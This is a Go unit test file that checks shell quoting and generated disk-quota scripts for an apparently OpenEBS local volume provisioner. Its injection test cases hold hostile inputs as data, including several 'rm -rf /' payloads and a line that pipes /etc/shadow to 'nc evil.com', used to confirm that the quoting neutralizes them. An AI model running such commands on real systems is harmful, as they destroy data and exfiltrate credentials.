package app

import (
	"strings"
	"testing"
)

func TestShellQuote(t *testing.T) {
	tests := map[string]struct {
		input    string
		expected string
	}{
		"simple path": {
			input:    "/var/openebs/local",
			expected: "'/var/openebs/local'",
		},
		"empty string": {
			input:    "",
			expected: "''",
		},
		"string with spaces": {
			input:    "/var/my path/local",
			expected: "'/var/my path/local'",
		},
		"string with double quotes": {
			input:    `/var/"openebs"/local`,
			expected: `'/var/"openebs"/local'`,
		},
		"string with single quote": {
			input:    "/var/open'ebs/local",
			expected: "'/var/open'\"'\"'ebs/local'",
		},
		"command injection via double quotes": {
			input:    `"; rm -rf / #`,
			expected: `'"; rm -rf / #'`,
		},
		"command injection via backticks": {
			input:    "`rm -rf /`",
			expected: "'`rm -rf /`'",
		},
		"command injection via dollar expansion": {
			input:    "$(rm -rf /)",
			expected: "'$(rm -rf /)'",
		},
		"command injection via single quote breakout": {
			input:    "'; rm -rf / '",
			expected: "''\"'\"'; rm -rf / '\"'\"''",
		},
		"newline injection": {
			input:    "/var/openebs\n; rm -rf /",
			expected: "'/var/openebs\n; rm -rf /'",
		},
		"semicolon and pipe": {
			input:    "/path; cat /etc/shadow | nc evil.com 1234",
			expected: "'/path; cat /etc/shadow | nc evil.com 1234'",
		},
	}

	for name, tc := range tests {
		t.Run(name, func(t *testing.T) {
			got := shellQuote(tc.input)
			if got != tc.expected {
				t.Errorf("shellQuote(%q) = %q, want %q", tc.input, got, tc.expected)
			}
		})
	}
}

func TestGenerateQuotaApplyScript_UsesShellQuoting(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		SoftLimitGrace: "1024k",
		HardLimitGrace: "2048k",
		HostPathPrefix: "",
	}

	script := GenerateQuotaApplyScript(cfg)

	// Verify that values are single-quoted, not double-quoted
	if !strings.Contains(script, "PARENT_PATH='/var/openebs/local'") {
		t.Errorf("expected single-quoted PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "VOLUME_PATH='/var/openebs/local/pvc-abc123'") {
		t.Errorf("expected single-quoted VOLUME_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "XFS_SOFT='1024k'") {
		t.Errorf("expected single-quoted XFS_SOFT, got:\n%s", script)
	}
}

func TestGenerateQuotaCleanupScript_UsesShellQuoting(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		HostPathPrefix: "/host",
	}

	script := GenerateQuotaCleanupScript(cfg)

	// PARENT_PATH / VOLUME_PATH stay as host paths (used with nsenter).
	if !strings.Contains(script, "PARENT_PATH='/var/openebs/local'") {
		t.Errorf("expected single-quoted host PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "VOLUME_PATH='/var/openebs/local/pvc-abc123'") {
		t.Errorf("expected single-quoted host VOLUME_PATH, got:\n%s", script)
	}
	// Container-visible path is for flock / path existence under the bind-mount.
	if !strings.Contains(script, "CONTAINER_PARENT_PATH='/host/var/openebs/local'") {
		t.Errorf("expected single-quoted prefixed CONTAINER_PARENT_PATH, got:\n%s", script)
	}
}

func TestGenerateQuotaCleanupScript_InjectionAttempt(t *testing.T) {
	// Simulate a malicious BasePath that made it past other checks
	cfg := QuotaScriptConfig{
		ParentDir:      "'; rm -rf / #",
		VolumeDir:      "pvc-abc123",
		HostPathPrefix: "",
	}

	script := GenerateQuotaCleanupScript(cfg)

	// The malicious content should be safely contained in single quotes.
	// It must NOT appear as unquoted shell syntax.
	if strings.Contains(script, "PARENT_PATH=';") {
		t.Errorf("injection not neutralized — malicious content escaped quotes:\n%s", script)
	}
	// The single-quote in the payload should be escaped
	if !strings.Contains(script, `'"'"'`) {
		t.Errorf("expected single-quote escaping in output:\n%s", script)
	}
}

func TestGenerateQuotaApplyScript_UsesNsenterWithHostPaths(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		SoftLimitGrace: "1024k",
		HardLimitGrace: "2048k",
		HostPathPrefix: "/host",
	}

	script := GenerateQuotaApplyScript(cfg)

	// Host paths for quota tools (must NOT be the /host/... bind-mount path).
	// Match whole assignment lines so CONTAINER_PARENT_PATH does not false-positive.
	if !hasAssignment(script, "PARENT_PATH", "/var/openebs/local") {
		t.Errorf("expected host PARENT_PATH, got:\n%s", script)
	}
	if !hasAssignment(script, "VOLUME_PATH", "/var/openebs/local/pvc-abc123") {
		t.Errorf("expected host VOLUME_PATH, got:\n%s", script)
	}
	if hasAssignment(script, "PARENT_PATH", "/host/var/openebs/local") {
		t.Errorf("PARENT_PATH must not use the pod bind-mount path:\n%s", script)
	}
	if hasAssignment(script, "VOLUME_PATH", "/host/var/openebs/local/pvc-abc123") {
		t.Errorf("VOLUME_PATH must not use the pod bind-mount path:\n%s", script)
	}

	// nsenter into the host mount namespace via the /host bind-mount of proc.
	if !strings.Contains(script, "HOST_MOUNT_NS='/host/proc/1/ns/mnt'") {
		t.Errorf("expected HOST_MOUNT_NS for nsenter, got:\n%s", script)
	}
	if !strings.Contains(script, `host_exec() { nsenter --mount="$HOST_MOUNT_NS" -- "$@"; }`) {
		t.Errorf("expected nsenter-based host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, `host_exec xfs_quota -x -c "project -s -p $VOLUME_PATH $PID" "$PARENT_PATH"`) {
		t.Errorf("expected xfs_quota via host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, `host_exec xfs_quota -x -c "limit -p bsoft=$XFS_SOFT bhard=$XFS_HARD $PID" "$PARENT_PATH"`) {
		t.Errorf("expected xfs_quota limit via host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, `host_exec setquota -P $PID $EXT_SOFT $EXT_HARD 0 0 "$PARENT_PATH"`) {
		t.Errorf("expected setquota via host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, `FS=$(host_exec stat -f -c %T "$VOLUME_PATH")`) {
		t.Errorf("expected stat via host_exec, got:\n%s", script)
	}
}

func TestGenerateQuotaCleanupScript_UsesNsenterWithHostPaths(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		HostPathPrefix: "/host",
	}

	script := GenerateQuotaCleanupScript(cfg)

	if !strings.Contains(script, "HOST_MOUNT_NS='/host/proc/1/ns/mnt'") {
		t.Errorf("expected HOST_MOUNT_NS for nsenter, got:\n%s", script)
	}
	if !strings.Contains(script, `host_exec() { nsenter --mount="$HOST_MOUNT_NS" -- "$@"; }`) {
		t.Errorf("expected nsenter-based host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, `host_exec xfs_quota -x -c "limit -p bsoft=0 bhard=0 $ID" "$PARENT_PATH"`) {
		t.Errorf("expected xfs_quota cleanup via host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, `host_exec rm -rf "$VOLUME_PATH"`) {
		t.Errorf("expected rm via host_exec, got:\n%s", script)
	}
	// Must not pass /host-prefixed paths to quota tools.
	if hasAssignment(script, "PARENT_PATH", "/host/var/openebs/local") {
		t.Errorf("PARENT_PATH must be the host path, not the bind-mount path:\n%s", script)
	}
	if !hasAssignment(script, "PARENT_PATH", "/var/openebs/local") {
		t.Errorf("expected host PARENT_PATH, got:\n%s", script)
	}
}

// hasAssignment reports whether script contains a whole line like NAME='value'
// (shell-quoted assignment produced by the script generator). Matching whole
// lines avoids false positives from longer names (e.g. CONTAINER_PARENT_PATH
// containing the substring PARENT_PATH=...).
func hasAssignment(script, name, value string) bool {
	needle := name + "=" + shellQuote(value)
	for _, line := range strings.Split(script, "\n") {
		if strings.TrimSpace(line) == needle {
			return true
		}
	}
	return false
}

func TestGenerateQuotaApplyScript_WithoutHostPrefix_NoNsenter(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/data",
		VolumeDir:      "pvc-abc123",
		SoftLimitGrace: "1024k",
		HardLimitGrace: "2048k",
		HostPathPrefix: "",
	}

	script := GenerateQuotaApplyScript(cfg)

	if strings.Contains(script, "HOST_MOUNT_NS=") {
		t.Errorf("did not expect HOST_MOUNT_NS without HostPathPrefix, got:\n%s", script)
	}
	if strings.Contains(script, "nsenter") {
		t.Errorf("did not expect nsenter without HostPathPrefix, got:\n%s", script)
	}
	// host_exec should be a passthrough.
	if !strings.Contains(script, `host_exec() { "$@"; }`) {
		t.Errorf("expected passthrough host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, "CONTAINER_PARENT_PATH='/data'") {
		t.Errorf("expected CONTAINER_PARENT_PATH to equal ParentDir, got:\n%s", script)
	}
}

func TestGenerateQuotaApplyScript_UseHostLockOnContainerPath(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		SoftLimitGrace: "1024k",
		HardLimitGrace: "2048k",
		HostPathPrefix: "/host",
		UseHostLock:    true,
	}

	script := GenerateQuotaApplyScript(cfg)

	// flock must open a container-visible path, not an unmapped host path.
	if !strings.Contains(script, `LOCKFILE="$CONTAINER_PARENT_PATH/.openebs-quota.lock"`) {
		t.Errorf("expected lockfile under CONTAINER_PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "CONTAINER_PARENT_PATH='/host/var/openebs/local'") {
		t.Errorf("expected container parent under /host, got:\n%s", script)
	}
	// Must not lock on the host path variable (invisible without nsenter).
	if strings.Contains(script, `LOCKFILE="$PARENT_PATH/.openebs-quota.lock"`) {
		t.Errorf("lockfile must not use PARENT_PATH (host path):\n%s", script)
	}
}

func TestQuotaPaths(t *testing.T) {
	tests := []struct {
		name                string
		cfg                 QuotaScriptConfig
		wantHostParent      string
		wantHostVolume      string
		wantContainerParent string
		wantHostMountNS     string
	}{
		{
			name: "daemonset with host prefix",
			cfg: QuotaScriptConfig{
				ParentDir:      "/var/openebs/local",
				VolumeDir:      "pvc-1",
				HostPathPrefix: "/host",
			},
			wantHostParent:      "/var/openebs/local",
			wantHostVolume:      "/var/openebs/local/pvc-1",
			wantContainerParent: "/host/var/openebs/local",
			wantHostMountNS:     "/host/proc/1/ns/mnt",
		},
		{
			name: "helper pod style with host prefix",
			cfg: QuotaScriptConfig{
				ParentDir:      "/var/openebs/local",
				VolumeDir:      "pvc-2",
				HostPathPrefix: HostPathPrefix,
			},
			wantHostParent:      "/var/openebs/local",
			wantHostVolume:      "/var/openebs/local/pvc-2",
			wantContainerParent: "/host/var/openebs/local",
			wantHostMountNS:     "/host/proc/1/ns/mnt",
		},
		{
			name: "no host prefix",
			cfg: QuotaScriptConfig{
				ParentDir:      "/data",
				VolumeDir:      "pvc-3",
				HostPathPrefix: "",
			},
			wantHostParent:      "/data",
			wantHostVolume:      "/data/pvc-3",
			wantContainerParent: "/data",
			wantHostMountNS:     "",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			hp, hv, cp := quotaPaths(tc.cfg)
			if hp != tc.wantHostParent || hv != tc.wantHostVolume || cp != tc.wantContainerParent {
				t.Errorf("quotaPaths() = (%q, %q, %q), want (%q, %q, %q)",
					hp, hv, cp, tc.wantHostParent, tc.wantHostVolume, tc.wantContainerParent)
			}
			if got := hostMountNSPath(tc.cfg); got != tc.wantHostMountNS {
				t.Errorf("hostMountNSPath() = %q, want %q", got, tc.wantHostMountNS)
			}
		})
	}
}
